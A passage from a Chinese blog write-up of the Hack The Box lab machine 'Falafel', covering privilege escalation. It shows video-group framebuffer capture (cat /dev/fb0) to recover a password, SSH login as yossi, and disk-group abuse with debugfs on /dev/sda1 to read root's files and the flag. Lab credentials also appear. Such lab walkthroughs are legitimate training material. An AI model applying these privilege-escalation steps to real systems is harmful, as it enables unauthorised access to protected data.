+<p>20、这个&#x2F;dev&#x2F;fb0设备很有趣。fb0是帧缓冲区，它为视频硬件提供了一个抽象。我们可以使用cat它并获取一个文件：</p>
+<p><code>https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#video-group</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">$ pwd<br>/home/moshe<br>$ cat /dev/fb0 &gt; screenshot.raw<br>$ ls -l screenshot.raw<br>-rw-rw-r-- <span class="hljs-number">1</span> moshe moshe <span class="hljs-number">4163040</span> May <span class="hljs-number">28</span> <span class="hljs-number">11</span>:<span class="hljs-number">41</span> screenshot.raw<br>$ <br></code></pre></td></tr></table></figure>
+
+<p>21、要查看此文件，我们还需要屏幕分辨率，可在以下位置找到&#x2F;sys&#x2F;class&#x2F;graphics&#x2F;fb0&#x2F;：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">$ ls -l /sys/<span class="hljs-class"><span class="hljs-keyword">class</span>/<span class="hljs-title">graphics</span>/<span class="hljs-title">fb0</span>/</span><br><span class="hljs-class"><span class="hljs-title">total</span> 0</span><br><span class="hljs-class">-<span class="hljs-title">rw</span>-<span class="hljs-title">r</span>--<span class="hljs-title">r</span>-- 1 <span class="hljs-title">root</span> <span class="hljs-title">root</span> 4096 <span class="hljs-title">May</span> 28 11:</span><span class="hljs-number">35</span> bits_per_pixel<br>-rw-r--r-- <span class="hljs-number">1</span> root root <span class="hljs-number">4096</span> May <span class="hljs-number">28</span> <span class="hljs-number">11</span>:<span class="hljs-number">35</span> blank<br>-rw-r--r-- <span class="hljs-number">1</span> root root <span class="hljs-number">4096</span> May <span class="hljs-number">28</span> <span class="hljs-number">11</span>:<span class="hljs-number">35</span> bl_curve<br>-rw-r--r-- <span class="hljs-number">1</span> root root <span class="hljs-number">4096</span> May <span class="hljs-number">28</span> <span class="hljs-number">11</span>:<span class="hljs-number">35</span> console<br>-rw-r--r-- <span class="hljs-number">1</span> root root <span class="hljs-number">4096</span> May <span class="hljs-number">28</span> <span class="hljs-number">11</span>:<span class="hljs-number">35</span> cursor<br>-r--r--r-- <span class="hljs-number">1</span> root root <span class="hljs-number">4096</span> May <span class="hljs-number">28</span> <span class="hljs-number">11</span>:<span class="hljs-number">35</span> dev<br>lrwxrwxrwx <span class="hljs-number">1</span> root root    <span class="hljs-number">0</span> May <span class="hljs-number">28</span> <span class="hljs-number">11</span>:<span class="hljs-number">42</span> device -&gt; ../../../<span class="hljs-number">0000</span>:<span class="hljs-number">00</span>:<span class="hljs-number">0f</span><span class="hljs-number">.0</span><br>-rw-r--r-- <span class="hljs-number">1</span> root root <span class="hljs-number">4096</span> May <span class="hljs-number">28</span> <span class="hljs-number">11</span>:<span class="hljs-number">35</span> mode<br>-rw-r--r-- <span class="hljs-number">1</span> root root <span class="hljs-number">4096</span> May <span class="hljs-number">28</span> <span class="hljs-number">11</span>:<span class="hljs-number">35</span> modes<br>-r--r--r-- <span class="hljs-number">1</span> root root <span class="hljs-number">4096</span> May <span class="hljs-number">28</span> <span class="hljs-number">11</span>:<span class="hljs-number">35</span> name<br>-rw-r--r-- <span class="hljs-number">1</span> root root <span class="hljs-number">4096</span> May <span class="hljs-number">28</span> <span class="hljs-number">11</span>:<span class="hljs-number">35</span> pan<br>drwxr-xr-x <span class="hljs-number">2</span> root root    <span class="hljs-number">0</span> May <span class="hljs-number">28</span> <span class="hljs-number">11</span>:<span class="hljs-number">35</span> power<br>-rw-r--r-- <span class="hljs-number">1</span> root root <span class="hljs-number">4096</span> May <span class="hljs-number">28</span> <span class="hljs-number">11</span>:<span class="hljs-number">35</span> rotate<br>-rw-r--r-- <span class="hljs-number">1</span> root root <span class="hljs-number">4096</span> May <span class="hljs-number">28</span> <span class="hljs-number">11</span>:<span class="hljs-number">35</span> state<br>-r--r--r-- <span class="hljs-number">1</span> root root <span class="hljs-number">4096</span> May <span class="hljs-number">28</span> <span class="hljs-number">11</span>:<span class="hljs-number">35</span> stride<br>lrwxrwxrwx <span class="hljs-number">1</span> root root    <span class="hljs-number">0</span> May <span class="hljs-number">28</span> <span class="hljs-number">11</span>:<span class="hljs-number">42</span> subsystem -&gt; ../../../../../<span class="hljs-class"><span class="hljs-keyword">class</span>/<span class="hljs-title">graphics</span></span><br><span class="hljs-class">-<span class="hljs-title">rw</span>-<span class="hljs-title">r</span>--<span class="hljs-title">r</span>-- 1 <span class="hljs-title">root</span> <span class="hljs-title">root</span> 4096 <span class="hljs-title">May</span> 28 05:</span><span class="hljs-number">13</span> uevent<br>-rw-r--r-- <span class="hljs-number">1</span> root root <span class="hljs-number">4096</span> May <span class="hljs-number">28</span> <span class="hljs-number">11</span>:<span class="hljs-number">35</span> virtual_size<br>$ cat /sys/<span class="hljs-class"><span class="hljs-keyword">class</span>/<span class="hljs-title">graphics</span>/<span class="hljs-title">fb0</span>/<span class="hljs-title">virtual_size</span></span><br><span class="hljs-class">1176,885</span><br><span class="hljs-class">$ </span><br></code></pre></td></tr></table></figure>
+
+<p>22、将其复制回kali：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">falafelIsReallyTasty<br><br>echo <span class="hljs-string">&#x27;falafelIsReallyTasty&#x27;</span> | xclip; scp moshe@<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.73</span>:/home/moshe/screenshot.raw .<br></code></pre></td></tr></table></figure>
+
+<p>23、这里图片太大了，我这里传输过于慢，就省略了</p>
+<p><img src="http://sh1yan.top/photo/Falafel-htb-writeup/9.webp" srcset="/img/loading.gif" lazyload></p>
+<p>24、使用上述发现的密码去登录尝试</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">yossi<br><br>MoshePlzStopHackingMe!<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ ssh yossi@<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.73</span>                                                     <br>yossi@<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.73&#x27;</span>s password: <br>Welcome to Ubuntu <span class="hljs-number">18.04</span><span class="hljs-number">.6</span> LTS (GNU/Linux <span class="hljs-number">4.15</span><span class="hljs-number">.0</span><span class="hljs-number">-213</span>-generic x86_64)<br><br> * Documentation:  https:<span class="hljs-comment">//help.ubuntu.com</span><br> * Management:     https:<span class="hljs-comment">//landscape.canonical.com</span><br> * Support:        https:<span class="hljs-comment">//ubuntu.com/advantage</span><br><br>Expanded Security Maintenance <span class="hljs-keyword">for</span> Infrastructure is not enabled.<br><br><span class="hljs-number">159</span> updates can be applied immediately.<br><span class="hljs-number">51</span> of these updates are standard security updates.<br>To see these additional updates run: apt <span class="hljs-built_in">list</span> --upgradable<br><br>Enable ESM Infra to receive additional <span class="hljs-built_in">future</span> security updates.<br>See https:<span class="hljs-comment">//ubuntu.com/esm or run: sudo pro status</span><br><br>Failed to connect to https:<span class="hljs-comment">//changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><br><br>Last login: Tue May <span class="hljs-number">28</span> <span class="hljs-number">05</span>:<span class="hljs-number">13</span>:<span class="hljs-number">40</span> <span class="hljs-number">2024</span><br>yossi@falafel:~$ id<br>uid=<span class="hljs-number">1000</span>(yossi) gid=<span class="hljs-number">1000</span>(yossi) groups=<span class="hljs-number">1000</span>(yossi),<span class="hljs-number">4</span>(adm),<span class="hljs-number">6</span>(disk),<span class="hljs-number">24</span>(cdrom),<span class="hljs-number">30</span>(dip),<span class="hljs-number">46</span>(plugdev),<span class="hljs-number">117</span>(lpadmin),<span class="hljs-number">118</span>(sambashare)<br>yossi@falafel:~$ <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">漏洞说明：用户“yossi”被发现是“disk”组的成员，该组授予了重要权限。据HackTricks称，“disk”组的成员身份几乎相当于 root 访问权限，因为它允许用户访问机器内的所有数据。这种情况带来了严重的安全风险，因为“yossi”可以滥用与“disk”组相关的提升权限来访问敏感数据。<br><br>使用“ debugfs ”命令直接在设备上访问文件系统/dev/sda1。此命令允许“ yossi ”与文件系统交互并可能访问敏感文件和目录。<br>遍历到关键目录，例如/root。<br>利用此漏洞可以读取敏感文件，例如root.txt。<br></code></pre></td></tr></table></figure>
+
+<p>25、直接利用特权获取最终的flag信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">yossi@falafel:~$ debugfs /dev/sda1<br>debugfs <span class="hljs-number">1.44</span><span class="hljs-number">.1</span> (<span class="hljs-number">24</span>-Mar<span class="hljs-number">-2018</span>)<br>debugfs:  pwd<br>[pwd]   INODE:      <span class="hljs-number">2</span>  PATH: /<br>[root]  INODE:      <span class="hljs-number">2</span>  PATH: /<br>debugfs:  cd /root<br>debugfs:  ls<br>debugfs:  cat root.txt<br>c1ebd591494df21891eee691ca4d320d<br>debugfs:  <br></code></pre></td></tr></table></figure>
+
+<h4 id="0x03-通关凭证展示"><a href="#0x03-通关凭证展示" class="headerlink" title="0x03 通关凭证展示"></a>0x03 通关凭证展示</h4><p><code>https://www.hackthebox.com/achievement/machine/1705469/124</code></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%89%93%E9%9D%B6%E8%AE%B0/" class="category-chain-item">打靶记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/shooting-range/" class="print-no-link">#shooting-range</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Falafel-htb-writeup</div>
+      <div>https://sh1yan.top/2024/05/29/Falafel-htb-writeup/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>shiyan</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年5月29日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/05/30/Resolute-htb-writeup/" title="Resolute-htb-writeup">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Resolute-htb-writeup</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/05/28/Sniper-htb-writeup/" title="Sniper-htb-writeup">
+                        <span class="hidden-mobile">Sniper-htb-writeup</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
